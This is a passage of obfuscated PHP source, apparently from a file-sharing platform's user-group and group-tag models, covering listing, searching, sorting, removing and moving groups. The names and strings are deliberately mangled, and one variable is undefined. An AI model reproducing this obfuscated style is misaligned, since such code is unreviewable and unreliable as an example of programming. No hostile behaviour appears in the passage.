=> $áÕàÊÖÏ); $this->_clearCache($ã¶ãÅß´); } return Model($§»“»Ôê[2079])->addAll($ğ¨ğ†íè, array(), !0); } protected function groupRemove($Æ€·Ï³ø, $ŠğÆØŸı = false) { $‡…œ¡ë =& $_SERVER[ˆö¿ÚÌ¼]; $ª­­Ú— = array($‡…œ¡ë[1986] => $Æ€·Ï³ø); $¨œÏßÂ = $this->where($ª­­Ú—)->find(); if (!$¨œÏßÂ || $¨œÏßÂ[$‡…œ¡ë[193]] == 0) { return !1; } if (!$ŠğÆØŸı) { $÷—šùÆ‡ = $this->getInfoSimple($¨œÏßÂ[$‡…œ¡ë[193]]); $this->_changeChildLevel($¨œÏßÂ, $÷—šùÆ‡, !0); $this->where(array($‡…œ¡ë[193] => $Æ€·Ï³ø))->save(array($‡…œ¡ë[193] => $¨œÏßÂ[$‡…œ¡ë[193]])); $this->_clearCache($÷—šùÆ‡[$‡…œ¡ë[1986]]); } Model($‡…œ¡ë[2079])->where($ª­­Ú—)->delete(); Model($‡…œ¡ë[2080])->where($ª­­Ú—)->delete(); Model($‡…œ¡ë[915])->groupRootRemove($Æ€·Ï³ø); $this->_clearCache($¨œÏßÂ[$‡…œ¡ë[193]]); return $this->where($ª­­Ú—)->delete(); } protected function groupSort($‰È¥±å“) { $–øË´“ =& $_SERVER[ˆö¿ÚÌ¼]; $Ÿü‹«» = array(); foreach ($‰È¥±å“ as $œ²Ÿ°ªŒ => $Ö¦ñ‘š¹) { $Ÿü‹«»[] = array($–øË´“[1986], $Ö¦ñ‘š¹, $–øË´“[2010], $œ²Ÿ°ªŒ + 1); } $this->saveAll($Ÿü‹«»); } public function listData() { $šÈ‘ø’ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($šÈ‘ø’[$_SERVER[ˆö¿ÚÌ¼][448]]); return $šÈ‘ø’; } private function _makeOrder($“´¥…â¯ = '') { $•îıà›Ì =& $_SERVER[ˆö¿ÚÌ¼]; $ÉÒ‡ó°ô = array($•îıà›Ì[1986], $•îıà›Ì[32], $•îıà›Ì[1974], $•îıà›Ì[234]); $ŒÜ¨°Â¶ = array($•îıà›Ì[535] => $•îıà›Ì[536], $•îıà›Ì[537] => $•îıà›Ì[538]); $Éç“”ÒŞ = Input::get($•îıà›Ì[542], $•îıà›Ì[7], $•îıà›Ì[1990], $ÉÒ‡ó°ô); $¸â‰ ß = Input::get($•îıà›Ì[543], $•îıà›Ì[7], $•îıà›Ì[2081], array($•îıà›Ì[2081], $•îıà›Ì[537])); $¸â‰ ß = $ŒÜ¨°Â¶[$¸â‰ ß]; $“´¥…â¯ = $“´¥…â¯ . "{$Éç“”ÒŞ}\40{$¸â‰ ß}\54\x20\x67\x72\157\165\x70\111\104\40\141\163\x63"; return $this->order($“´¥…â¯); } public function listChild($ìÔ ‘’) { $³¸Ç§Œ =& $_SERVER[ˆö¿ÚÌ¼]; $ï¡¸Ïß˜ = $this->where(array($³¸Ç§Œ[193] => $ìÔ ‘’))->_makeOrder()->selectPage(200); $this->_listDataApply($ï¡¸Ïß˜[$³¸Ç§Œ[448]]); return $ï¡¸Ïß˜; } public function listChildIds($©“Ë±¦Œ) { $úá€’éŒ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_string($¿©Ø“˜ö)) { $©“Ë±¦Œ = explode($úá€’éŒ[50], $©“Ë±¦Œ); } $›²©©£ = $this->where(array($úá€’éŒ[1986] => array($úá€’éŒ[7], $©“Ë±¦Œ)))->field($úá€’éŒ[2082])->select(); if (!$›²©©£) { return !1; } $€áøÏš¬ = array(); foreach ($›²©©£ as $Å´ˆú¬è) { $€áøÏš¬[] = "\x73\x65\x6c\x65\x63\164\40\x67\162\x6f\x75\x70\111\104\40\146\x72\x6f\x6d\40\140\147\162\157\x75\x70\x60\40\x77\x68\x65\162\x65\40\160\141\x72\145\x6e\x74\x4c\145\x76\x65\154\40\x6c\x69\x6b\145\40\47{$Å´ˆú¬è[$úá€’éŒ[598]]}{$Å´ˆú¬è[$úá€’éŒ[1986]]}\54\45\x27"; } $€áøÏš¬ = implode($úá€’éŒ[2083], $€áøÏš¬); $›²©©£ = $this->query($€áøÏš¬); if (!$›²©©£) { return array(); } $©“Ë±¦Œ = array_to_keyvalue($›²©©£, $úá€’éŒ[12], $úá€’éŒ[1986]); return array_unique($©“Ë±¦Œ); } public function listByID($œ¥ñçß¯) { $ç˜¬¯Â£ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$œ¥ñçß¯) { return array(); } $¨Ø„èàØ = array($ç˜¬¯Â£[1986] => array($ç˜¬¯Â£[7], $œ¥ñçß¯)); $—ñªÇÇë = $this->where($¨Ø„èàØ)->select(); $—ñªÇÇë = array_sort_keep($—ñªÇÇë, $ç˜¬¯Â£[1986], $œ¥ñçß¯); $this->_listDataApply($—ñªÇÇë); return $—ñªÇÇë; } public function listSearch($½µùŒáú) { $Â€Ÿƒñ =& $_SERVER[ˆö¿ÚÌ¼]; $Ò½Ä÷·º = trim($½µùŒáú[$Â€Ÿƒñ[2084]]); $”»õÆá½ = explode($Â€Ÿƒñ[53], $Ò½Ä÷·º); if (!$Ò½Ä÷·º || count($”»õÆá½) == 1) { return $this->listSearchNow($½µùŒáú); } $òºŒ˜èÈ = array($Â€Ÿƒñ[448] => array()); foreach ($”»õÆá½ as $ßåı¥†ñ) { if (!trim($ßåı¥†ñ)) { continue; } $½µùŒáú[$Â€Ÿƒñ[2084]] = $ßåı¥†ñ; $¼ó™Ã÷  = $this->listSearchNow($½µùŒáú); $òºŒ˜èÈ[$Â€Ÿƒñ[448]] = array_merge($òºŒ˜èÈ[$Â€Ÿƒñ[448]], $¼ó™Ã÷ [$Â€Ÿƒñ[448]]); } $òºŒ˜èÈ[$Â€Ÿƒñ[448]] = array_unique_by_key($òºŒ˜èÈ[$Â€Ÿƒñ[448]], $Â€Ÿƒñ[1986]); $òºŒ˜èÈ[$Â€Ÿƒñ[445]] = array($Â€Ÿƒñ[446] => count($òºŒ˜èÈ[$Â€Ÿƒñ[448]]), $Â€Ÿƒñ[442] => 20, $Â€Ÿƒñ[431] => 1, $Â€Ÿƒñ[447] => 1); return $òºŒ˜èÈ; } public function listSearchNow($²¤‹çÙ) { $àÁ˜Åø› =& $_SERVER[ˆö¿ÚÌ¼]; $ÇŞÎà” = trim($²¤‹çÙ[$àÁ˜Åø›[2084]]); $˜æğ¥åÕ = isset($²¤‹çÙ[$àÁ˜Åø›[2085]]) ? $²¤‹çÙ[$àÁ˜Åø›[2085]] : !1; if (!trim($ÇŞÎà”)) { return !1; } $ÇŞÎà” = str_replace($àÁ˜Åø›[2086], $àÁ˜Åø›[2087], $ÇŞÎà”); $ªíòˆøÎ = array($àÁ˜Åø›[1986] => array($àÁ˜Åø›[462], "{$ÇŞÎà”}\x25"), $àÁ˜Åø›[32] => array($àÁ˜Åø›[462], "\45{$ÇŞÎà”}\45"), $àÁ˜Åø›[1091] => $àÁ˜Åø›[2088]); if ($˜æğ¥åÕ) { $ëÃêÕàÆ = $this->getInfoSimple($˜æğ¥åÕ); $š‚Ä—½± = $ëÃêÕàÆ[$àÁ˜Åø›[598]] . $˜æğ¥åÕ . $àÁ˜Åø›[630]; $ªíòˆøÎ = array($ªíòˆøÎ, array($àÁ˜Åø›[598] => array($àÁ˜Åø›[462], $š‚Ä—½±))); } $ªíòˆøÎ = $this->parseWhereLike($ªíòˆøÎ); $È‹›ßÎ = $this->_makeOrder()->where($ªíòˆøÎ)->selectPage(20); $È‹›ßÎ = $È‹›ßÎ ? $È‹›ßÎ : array($àÁ˜Åø›[448] => array(), $àÁ˜Åø›[445] => array()); if (!$È‹›ßÎ || count($È‹›ßÎ[$àÁ˜Åø›[448]]) < 5 && Input::check($ÇŞÎà”, $àÁ˜Åø›[396])) { $µ‘¯äÔ = $this->groupChildrenAll($˜æğ¥åÕ); $¾ı’ø²ñ = $this->_searchFromMeta($àÁ˜Åø›[549], $ÇŞÎà”, 10, $µ‘¯äÔ); $ï‡ª¸” = $this->_searchFromMeta($àÁ˜Åø›[550], $ÇŞÎà”, 10, $µ‘¯äÔ); $´ê¢Øµ = array_merge($¾ı’ø²ñ, $ï‡ª¸”, $È‹›ßÎ[$àÁ˜Åø›[448]]); $È‹›ßÎ[$àÁ˜Åø›[448]] = array_unique_by_key($´ê¢Øµ, $àÁ˜Åø›[1986]); $È‹›ßÎ[$àÁ˜Åø›[445]][$àÁ˜Åø›[446]] = count($È‹›ßÎ[$àÁ˜Åø›[448]]); $È‹›ßÎ[$àÁ˜Åø›[445]][$àÁ˜Åø›[447]] = ceil($È‹›ßÎ[$àÁ˜Åø›[445]][$àÁ˜Åø›[446]] / $È‹›ßÎ[$àÁ˜Åø›[445]][$àÁ˜Åø›[442]]); } $this->_listDataApply($È‹›ßÎ[$àÁ˜Åø›[448]]); return $È‹›ßÎ; } protected function groupChildrenAll($‰Š¿ê) { $Õ×»Ãˆë =& $_SERVER[ˆö¿ÚÌ¼]; if (!$‰Š¿ê) { return !1; } if (!is_array($‰Š¿ê)) { $‰Š¿ê = array($‰Š¿ê); } $ìµß‘ƒÏ = $‰Š¿ê; foreach ($‰Š¿ê as $šå”š„ï) { $Ç½ãæ = $this->getInfoSimple($šå”š„ï); $ñÅö’üÔ = array($Õ×»Ãˆë[598] => array($Õ×»Ãˆë[462], $Ç½ãæ[$Õ×»Ãˆë[598]] . $šå”š„ï . $Õ×»Ãˆë[630])); $äâ”Éîô = $this->field($Õ×»Ãˆë[1986])->where($ñÅö’üÔ)->select(); $ìµß‘ƒÏ = array_merge($ìµß‘ƒÏ, array_to_keyvalue($äâ”Éîô, $Õ×»Ãˆë[12], $Õ×»Ãˆë[1986])); } return array_unique($ìµß‘ƒÏ); } private function _searchFromMeta($›«Ÿ¾şÑ, $‡‘¼µÒ©, $ÕŸ™ÛÃ», $Ù”×¢Æ) { $›«Î ‰ê =& $_SERVER[ˆö¿ÚÌ¼]; $‡‘¼µÒ© = strtolower($‡‘¼µÒ©); $Ëëı•² = array($›«Î ‰ê[97] => $›«Ÿ¾şÑ, $›«Î ‰ê[453] => array($›«Î ‰ê[462], "\45{$‡‘¼µÒ©}\45")); $Ëëı•² = $this->parseWhereLike($Ëëı•²); if ($Ù”×¢Æ) { $Ëëı•²[$›«Î ‰ê[1986]] = array($›«Î ‰ê[7], $Ù”×¢Æ); } $È½°¬€© = Model($›«Î ‰ê[2089])->where($Ëëı•²)->limit($ÕŸ™ÛÃ»)->select(); if (!$È½°¬€©) { return array(); } $È½°¬€© = array_to_keyvalue($È½°¬€©, $›«Î ‰ê[12], $›«Î ‰ê[1986]); $È¿ÑÎîĞ = $this->where(array($›«Î ‰ê[2078] => array($›«Î ‰ê[7], $È½°¬€©)))->select(); if (!$È¿ÑÎîĞ) { return array(); } return $È¿ÑÎîĞ; } protected function _listDataApplyItem($ÄÍÖÔ†è) { $×ÛåŒ©€ = array($ÄÍÖÔ†è); $this->_listDataApply($×ÛåŒ©€); return $×ÛåŒ©€[0]; } protected function _listDataApply(&$ÈŸûçŠ‚) { $ÖÍï«¦ü =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ÈŸûçŠ‚) { return; } $®Ü»È´ = array_to_keyvalue($ÈŸûçŠ‚, $ÖÍï«¦ü[12], $ÖÍï«¦ü[1986]); $this->_listAppendChildren($ÈŸûçŠ‚); $this->_listAppendChildrenMember($ÈŸûçŠ‚); $this->_listAppendMeta($ÈŸûçŠ‚, $®Ü»È´); $this->_listAppendParent($ÈŸûçŠ‚); $this->_listAppendSourceRoot($ÈŸûçŠ‚, $®Ü»È´); } private function _listAppendChildren(&$öÇ¨¡˜) { $­ñ³®ü¯ =& $_SERVER[ˆö¿ÚÌ¼]; $û÷¼Ö˜Î = array_to_keyvalue($öÇ¨¡˜, $­ñ³®ü¯[12], $­ñ³®ü¯[1986]); $‡°ùšøØ = array($­ñ³®ü¯[193] => array($­ñ³®ü¯[7], $û÷¼Ö˜Î)); $·‹Åã¤· = array($­ñ³®ü¯[193], $­ñ³®ü¯[2090] => $­ñ³®ü¯[579]); $”‰Ğúïò = $this->field($·‹Åã¤·)->where($‡°ùšøØ)->group($­ñ³®ü¯[193])->select(); $ªßéÀºâ = array_to_keyvalue($”‰Ğúïò, $­ñ³®ü¯[193], $­ñ³®ü¯[579]); foreach ($öÇ¨¡˜ as &$à‰ƒ¬¼ï) { $ğ¡°˜´® = $à‰ƒ¬¼ï[$­ñ³®ü¯[1986]]; $à‰ƒ¬¼ï[$­ñ³®ü¯[2091]] = isset($ªßéÀºâ[$ğ¡°˜´®]) ? intval($ªßéÀºâ[$ğ¡°˜´®]) : !1; } unset($à‰ƒ¬¼ï); } private function _listAppendChildrenMember(&$ü©å»Ï€) { $ãÅ¸ÃÔ” =& $_SERVER[ˆö¿ÚÌ¼]; $ÙşÉ™ºß = array_to_keyvalue($ü©å»Ï€, $ãÅ¸ÃÔ”[12], $ãÅ¸ÃÔ”[1986]); $´¯Ü·¯€ = array($ãÅ¸ÃÔ”[1986] => array($ãÅ¸ÃÔ”[7], $ÙşÉ™ºß)); $õ°ûÁÄá = array($ãÅ¸ÃÔ”[1986], $ãÅ¸ÃÔ”[2090] => $ãÅ¸ÃÔ”[579]); $¸×¾ü³ = Model($ãÅ¸ÃÔ”[2080])->field($õ°ûÁÄá)->where($´¯Ü·¯€)->group($ãÅ¸ÃÔ”[1986])->select(); $ˆÌõëÙ£ = array_to_keyvalue($¸×¾ü³, $ãÅ¸ÃÔ”[1986], $ãÅ¸ÃÔ”[579]); foreach ($ü©å»Ï€ as &$üÅÊÊÒ‘) { $ÍÀì¸º = $üÅÊÊÒ‘[$ãÅ¸ÃÔ”[1986]]; $üÅÊÊÒ‘[$ãÅ¸ÃÔ”[2092]] = isset($ˆÌõëÙ£[$ÍÀì¸º]) ? intval($ˆÌõëÙ£[$ÍÀì¸º]) : !1; } unset($üÅÊÊÒ‘); } private function _listAppendMeta(&$…ŠèÀ°Ê, $Ÿü¾öïå) { $»ÎçåÄ =& $_SERVER[ˆö¿ÚÌ¼]; $Şó¹±— = array($»ÎçåÄ[1986] => array($»ÎçåÄ[7], $Ÿü¾öïå)); $ üé¼Ï§ = Model($»ÎçåÄ[2079])->where($Şó¹±—)->select(); $ üé¼Ï§ = array_to_keyvalue_group($ üé¼Ï§, $»ÎçåÄ[1986]); foreach ($ üé¼Ï§ as &$ÄÙ·Ñ±) { $ÄÙ·Ñ± = array_to_keyvalue($ÄÙ·Ñ±, $»ÎçåÄ[97], $»ÎçåÄ[453]); } unset($ÄÙ·Ñ±); foreach ($…ŠèÀ°Ê as &$À¼àÈšç) { $À¼àÈšç[$»ÎçåÄ[553]] = array(); if (isset($ üé¼Ï§[$À¼àÈšç[$»ÎçåÄ[1986]]])) { $À¼àÈšç[$»ÎçåÄ[553]] = $ üé¼Ï§[$À¼àÈšç[$»ÎçåÄ[1986]]]; } } unset($À¼àÈšç); } protected function parentLevelArray($ùÜİ˜­ê) { $úùÂçù¥ =& $_SERVER[ˆö¿ÚÌ¼]; $ùÜİ˜­ê = explode($úùÂçù¥[50], trim($ùÜİ˜­ê, $úùÂçù¥[50])); $ùÜİ˜­ê = array_remove_value($ùÜİ˜­ê, $úùÂçù¥[231]); return $ùÜİ˜­ê; } protected function parentInGroup($Ñà™ääï, $è½ˆ–ÀÙ) { $ø¸¯°¬ƒ =& $_SERVER[ˆö¿ÚÌ¼]; $Ó–Öçô = $this->getInfoSimple($Ñà™ääï); if (!$Ó–Öçô) { return !0; } $»ë¦äûØ = $this->parentLevelArray($Ó–Öçô[$ø¸¯°¬ƒ[598]]); $»ë¦äûØ[] = $Ñà™ääï; foreach ($»ë¦äûØ as $Ñà™ääï) { if (in_array($Ñà™ääï . $ø¸¯°¬ƒ[12], $è½ˆ–ÀÙ)) { return !0; } } return !1; } private function _listAppendParent(&$ê¾üå¹) { $ÇóÒÎº =& $_SERVER[ˆö¿ÚÌ¼]; $ªú”ñš = array(); foreach ($ê¾üå¹ as &$³áÄƒë¤) { $ªú”ñš[$³áÄƒë¤[$ÇóÒÎº[1986]]] = $³áÄƒë¤[$ÇóÒÎº[32]]; $Ùª¢Å‚Ô = $this->parentLevelArray($³áÄƒë¤[$ÇóÒÎº[598]]); foreach ($Ùª¢Å‚Ô as $šœÓÙ¸Ú) { if (!isset($ªú”ñš[$šœÓÙ¸Ú])) { $ªú”ñš[$šœÓÙ¸Ú] = 0; } } } unset($³áÄƒë¤); foreach ($ªú”ñš as $©Ãœ›ä => $¿°ûøƒà) { if ($¿°ûøƒà) { continue; } $âÃßµÒ = $this->getInfoSimple($©Ãœ›ä); $ªú”ñš[$©Ãœ›ä] = $âÃßµÒ[$ÇóÒÎº[32]]; } $Òê€ßŒØ = $GLOBALS[$ÇóÒÎº[6]][$ÇóÒÎº[92]][$ÇóÒÎº[2093]]; if (KodUser::isRoot()) { $Òê€ßŒØ = !1; } foreach ($ê¾üå¹ as &$³áÄƒë¤) { $Ùª¢Å‚Ô = $this->parentLevelArray($³áÄƒë¤[$ÇóÒÎº[598]]); $õçüÀ‹ç = $ÇóÒÎº[12]; foreach ($Ùª¢Å‚Ô as $©Ãœ›ä => $šœÓÙ¸Ú) { if ($Òê€ßŒØ && $©Ãœ›ä == 0) { continue; } $õçüÀ‹ç .= $ªú”ñš[$šœÓÙ¸Ú] . $ÇóÒÎº[8]; } if ($Ùª¢Å‚Ô) { $õçüÀ‹ç .= $³áÄƒë¤[$ÇóÒÎº[32]]; } $³áÄƒë¤[$ÇóÒÎº[603]] = str_replace($ÇóÒÎº[257], $ÇóÒÎº[8], $õçüÀ‹ç); } unset($³áÄƒë¤); } private function _listAppendSourceRoot(&$„Ñ¢„ë”, $‹‚Û¿—Ï) { $å´ƒñ£ =& $_SERVER[ˆö¿ÚÌ¼]; $ŒîËº¹Õ = Model($å´ƒñ£[915])->listSourceRoot(SourceModel::TYPE_GROUP, $‹‚Û¿—Ï); $ŒîËº¹Õ = array_to_keyvalue($ŒîËº¹Õ, $å´ƒñ£[583]); $ŒîËº¹Õ = array_remove_key($ŒîËº¹Õ, $å´ƒñ£[583]); foreach ($„Ñ¢„ë” as &$àÈ‡—¦) { $àÈ‡—¦[$å´ƒñ£[90]] = $ŒîËº¹Õ[$àÈ‡—¦[$å´ƒñ£[1986]]] ? $ŒîËº¹Õ[$àÈ‡—¦[$å´ƒñ£[1986]]] : array(); } unset($àÈ‡—¦); } protected function groupMerge($§§ùÆÍö) { $§§ùÆÍö = array_values(array_unique($§§ùÆÍö)); $ıŒÂÙçÇ = array(); for ($Ü¯ä×å† = 0; $Ü¯ä×å† < count($§§ùÆÍö); $Ü¯ä×å†++) { $ÖÖÄº´„ = !1; for ($ŒæÀÉŒ = 0; $ŒæÀÉŒ < count($§§ùÆÍö); $ŒæÀÉŒ++) { if ($Ü¯ä×å† == $ŒæÀÉŒ) { continue; } if ($this->isParentOf($§§ùÆÍö[$ŒæÀÉŒ], $§§ùÆÍö[$Ü¯ä×å†])) { $ÖÖÄº´„ = !0; break; } } if (!$ÖÖÄº´„) { $ıŒÂÙçÇ[] = $§§ùÆÍö[$Ü¯ä×å†]; } } return $ıŒÂÙçÇ; } protected function isParentOf($÷ÙÉµÅ™, $öêÆ³èÓ) { $øê¿Ğ„Œ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$÷ÙÉµÅ™ || !$öêÆ³èÓ || $÷ÙÉµÅ™ == $öêÆ³èÓ) { return !1; } $Ïãû£Ñ¦ = $this->getInfoSimple($÷ÙÉµÅ™); $¯Â…Š = $this->getInfoSimple($öêÆ³èÓ); $å¬ùüğê = $Ïãû£Ñ¦[$øê¿Ğ„Œ[598]] . $÷ÙÉµÅ™ . $øê¿Ğ„Œ[50]; if (substr($¯Â…Š[$øê¿Ğ„Œ[598]], 0, strlen($å¬ùüğê)) == $å¬ùüğê) { return !0; } return !1; } public function groupShowRoot($«ŸóÃÌ, $åÁÓ¢ÓŞ = false) { $ª—ğ†™ =& $_SERVER[ˆö¿ÚÌ¼]; $Ú™Á½Òï = $this->getInfo($«ŸóÃÌ); if (!$Ú™Á½Òï) { return array(); } $óÅÎ›ä = $this->parentLevelArray($Ú™Á½Òï[$ª—ğ†™[598]]); $±ÇíÉ®À = array($«ŸóÃÌ); if (count($óÅÎ›ä) == 0) { return $±ÇíÉ®À; } if ($åÁÓ¢ÓŞ && count($óÅÎ›ä) == 1) { return $±ÇíÉ®À; } if (!$Ú™Á½Òï[$ª—ğ†™[553]] || !isset($Ú™Á½Òï[$ª—ğ†™[553]][$ª—ğ†™[2076]]) || $Ú™Á½Òï[$ª—ğ†™[553]][$ª—ğ†™[2076]] == $ª—ğ†™[861]) { return $this->groupShowRoot($óÅÎ›ä[count($óÅÎ›ä) - 1], $åÁÓ¢ÓŞ); } if ($Ú™Á½Òï[$ª—ğ†™[553]][$ª—ğ†™[2076]] == $ª—ğ†™[435]) { $‘öâæ–ã = explode($ª—ğ†™[50], $Ú™Á½Òï[$ª—ğ†™[553]][$ª—ğ†™[2077]]); if ($‘öâæ–ã) { $±ÇíÉ®À = array_merge($±ÇíÉ®À, $‘öâæ–ã); } } return $±ÇíÉ®À; } protected function resetParentLevel() { $òìã˜÷ =& $_SERVER[ˆö¿ÚÌ¼]; $ÅêŠ¾“Ù = $òìã˜÷[1986]; $æºæ¶¿à = $this->select(); $æºæ¶¿à = array_to_keyvalue($æºæ¶¿à, $ÅêŠ¾“Ù); foreach ($æºæ¶¿à as $¼áÅ£•Ñ) { $Õ¿÷Óë = $¼áÅ£•Ñ; $®’¡Ü« = array(); while ($Õ¿÷Óë[$òìã˜÷[193]] != 0) { $®’¡Ü«[] = $Õ¿÷Óë[$òìã˜÷[193]]; $Õ¿÷Óë = $æºæ¶¿à[$Õ¿÷Óë[$òìã˜÷[193]]]; } $®’¡Ü«[] = 0; $®’¡Ü« = $òìã˜÷[50] . implode($òìã˜÷[50], array_reverse($®’¡Ü«)) . $òìã˜÷[50]; $this->setNamePinyin($¼áÅ£•Ñ[$ÅêŠ¾“Ù], $¼áÅ£•Ñ[$òìã˜÷[32]]); $this->where(array($ÅêŠ¾“Ù => $¼áÅ£•Ñ[$ÅêŠ¾“Ù]))->save(array($òìã˜÷[669] => $®’¡Ü«)); } return $æºæ¶¿à; } public function groupNameAuto($‡‚…ÔÀº, $í°è½õ„) { $‘«Áú«Ñ =& $_SERVER[ˆö¿ÚÌ¼]; $¥ƒ»šãç = $this->where(array($‘«Áú«Ñ[489] => $‡‚…ÔÀº))->getField($‘«Áú«Ñ[32], !0); if (!$¥ƒ»šãç || !in_array($í°è½õ„, $¥ƒ»šãç)) { return $í°è½õ„; } for ($¿’ËÌœÇ = 1; $¿’ËÌœÇ <= count($¥ƒ»šãç) + 1; $¿’ËÌœÇ++) { $ª¹ÄƒÃ = $í°è½õ„ . "\50{$¿’ËÌœÇ}\x29"; if (!in_array($ª¹ÄƒÃ, $¥ƒ»šãç)) { return $ª¹ÄƒÃ; } } } public function groupSwitch($ş¾ôœêï, $³¿½ŞË›) { $ĞîË¾Ÿı =& $_SERVER[ˆö¿ÚÌ¼]; $·á×ê = array($ĞîË¾Ÿı[1986] => array($ĞîË¾Ÿı[7], array($ş¾ôœêï, $³¿½ŞË›))); $Û¢ïØöÒ = $this->where($·á×ê)->select(); $Û¢ïØöÒ = array_to_keyvalue($Û¢ïØöÒ, $ĞîË¾Ÿı[1986]); if (!isset($Û¢ïØöÒ[$ş¾ôœêï]) || !isset($Û¢ïØöÒ[$³¿½ŞË›]) || $Û¢ïØöÒ[$ş¾ôœêï][$ĞîË¾Ÿı[193]] == 0) { return !1; } $·á×ê = array($ĞîË¾Ÿı[1986] => $ş¾ôœêï); $™Ñ‹³¶ = Model($ĞîË¾Ÿı[2080])->where($·á×ê)->select(); if (!$™Ñ‹³¶) { $™Ñ‹³¶ = array(); } foreach ($™Ñ‹³¶ as $¾Éşì‹ ) { $À‰ÌœËŒ = $¾Éşì‹ [$ĞîË¾Ÿı[1785]]; $·á×ê = array($ĞîË¾Ÿı[1785] => $À‰ÌœËŒ, $ĞîË¾Ÿı[1986] => $³¿½ŞË›); $ÉóÆÒÑ = Model($ĞîË¾Ÿı[2080])->where($·á×ê)->find(); if (!$ÉóÆÒÑ) { $ã…›Í»˜ = array($³¿½ŞË› => $¾Éşì‹ [$ĞîË¾Ÿı[2094]]); Model($ĞîË¾Ÿı[611])->userGroupAdd($À‰ÌœËŒ, $ã…›Í»˜); } Model($ĞîË¾Ÿı[611])->userGroupRemove($À‰ÌœËŒ, $ş¾ôœêï); } $·á×ê = array($ĞîË¾Ÿı[191] => 2, $ĞîË¾Ÿı[193] => 0, $ĞîË¾Ÿı[497] => 1, $ĞîË¾Ÿı[583] => array($ĞîË¾Ÿı[7], array($ş¾ôœêï, $³¿½ŞË›))); $ƒÈêŸ¤Ì = Model($ĞîË¾Ÿı[915])->where($·á×ê)->field($ĞîË¾Ÿı[2095])->select(); $ƒÈêŸ¤Ì = array_to_keyvalue($ƒÈêŸ¤Ì, $ĞîË¾Ÿı[583], $ĞîË¾Ÿı[194]); $ªÊö¿¢² = !empty($ƒÈêŸ¤Ì[$ş¾ôœêï]) ? $ƒÈêŸ¤Ì[$ş¾ôœêï] : !1; if ($ªÊö¿¢²) { if (!$ƒÈêŸ¤Ì[$³¿½ŞË›]) { $ƒÈêŸ¤Ì[$³¿½ŞË›] = Model($ĞîË¾Ÿı[915])->groupRootAdd($³¿½ŞË›); } $ú„Œ©ÂÈ = $ƒÈêŸ¤Ì[$³¿½ŞË›]; $·á×ê = array($ĞîË¾Ÿı[193] => $ªÊö¿¢²); $ƒÈêŸ¤Ì = Model($ĞîË¾Ÿı[915])->where($·á×ê)->field($ĞîË¾Ÿı[2096])->select(); if (!$ƒÈêŸ¤Ì) { $ƒÈêŸ¤Ì = array(); } Model($ĞîË¾Ÿı[915])->moveClearAuth = !1; foreach ($ƒÈêŸ¤Ì as $ú¯ÒÕÙ) { $ÏİÌ˜öã = $ú¯ÒÕÙ[$ĞîË¾Ÿı[497]] == $ĞîË¾Ÿı[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ĞîË¾Ÿı[915])->move($ú¯ÒÕÙ[$ĞîË¾Ÿı[194]], $ú„Œ©ÂÈ, $ÏİÌ˜öã); } Model($ĞîË¾Ÿı[915])->moveClearAuth = !0; $·á×ê = array($ĞîË¾Ÿı[191] => 2, $ĞîË¾Ÿı[583] => $ş¾ôœêï); $™şéÍË‡ = array($ĞîË¾Ÿı[583] => $³¿½ŞË›); Model($ĞîË¾Ÿı[2097])->where($·á×ê)->save($™şéÍË‡); Model($ĞîË¾Ÿı[2098])->where($·á×ê)->save($™şéÍË‡); } $this->_changeChildLevel($Û¢ïØöÒ[$ş¾ôœêï], $Û¢ïØöÒ[$³¿½ŞË›], !0); $this->where(array($ĞîË¾Ÿı[193] => $ş¾ôœêï))->save(array($ĞîË¾Ÿı[193] => $³¿½ŞË›)); $this->_clearChildrenCache($Û¢ïØöÒ[$³¿½ŞË›]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\137\x66\141\166"; protected function cacheFunctionAlias($¢şøËÄÙ) { $Œ³À©–¥ =& $_SERVER[ˆö¿ÚÌ¼]; return array($Œ³À©–¥[2099] => array($¢şøËÄÙ[0], $Œ³À©–¥[2100]), $Œ³À©–¥[2101] => array($¢şøËÄÙ[0], $Œ³À©–¥[2102])); } protected function get($ÊÓ×Œ”ù) { $Ôûç„ÉÏ =& $_SERVER[ˆö¿ÚÌ¼]; $Çß«‡Öä = Model($Ôûç„ÉÏ[599])->metaGet($ÊÓ×Œ”ù, $Ôûç„ÉÏ[2103]); $ç§¡éÏ– = json_decode($Çß«‡Öä, !0); return $ç§¡éÏ– ? $ç§¡éÏ– : array($Ôûç„ÉÏ[2104] => $Ôûç„ÉÏ[91], $Ôûç„ÉÏ[448] => array()); } protected function set($†´™şêÃ, $Âñ¢İ) { $ÇèªÆ» =& $_SERVER[ˆö¿ÚÌ¼]; $Âñ¢İ = $Âñ¢İ ? $Âñ¢İ : array($ÇèªÆ»[2104] => $ÇèªÆ»[91], $ÇèªÆ»[448] => array()); return Model($ÇèªÆ»[599])->metaSet($†´™şêÃ, $ÇèªÆ»[2103], json_encode($Âñ¢İ)); } protected function getByTagID($ âé•¼, $Ÿûúßì¿) { $ìò† û =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ âé•¼ || !$Ÿûúßì¿) { return !1; } if (!Model($ìò† û[599])->getInfoSimple($ âé•¼)) { return !1; } $ûû«»×¼ = $this->get($ âé•¼); if (!$ûû«»×¼ || !isset($ûû«»×¼[$ìò† û[448]])) { return !1; } $Ì‰Çá§Ş = array_find_by_field($ûû«»×¼[$ìò† û[448]], $ìò† û[478], $Ÿûúßì¿); return is_array($Ì‰Çá§Ş) ? $Ì‰Çá§Ş : !1; } public function listSource($†á‚ïª›, $Ô²¦ü¸ñ) { $î¾Ç‰ó =& $_SERVER[ˆö¿ÚÌ¼]; if ($Ô²¦ü¸ñ && !is_array($Ô²¦ü¸ñ)) { $Ô²¦ü¸ñ = array($Ô²¦ü¸ñ); } $ßÇÄ·ã˜ = $this->listData($†á‚ïª›); $á“İ¥š¦ = array(); foreach ($ßÇÄ·ã˜ as $âå±§—À) { $¨‘ëñ÷¤ = $âå±§—À[$î¾Ç‰ó[87]]; if (!$¨‘ëñ÷¤) { continue; } if (!isset($á“İ¥š¦[$¨‘ëñ÷¤])) { $á“İ¥š¦[$¨‘ëñ÷¤] = array(); } $á“İ¥š¦[$¨‘ëñ÷¤][] = $âå±§—À[$î¾Ç‰ó[512]]; } $´­Ú©× = array(); foreach ($á“İ¥š¦ as $Øİ‰¹Ü© 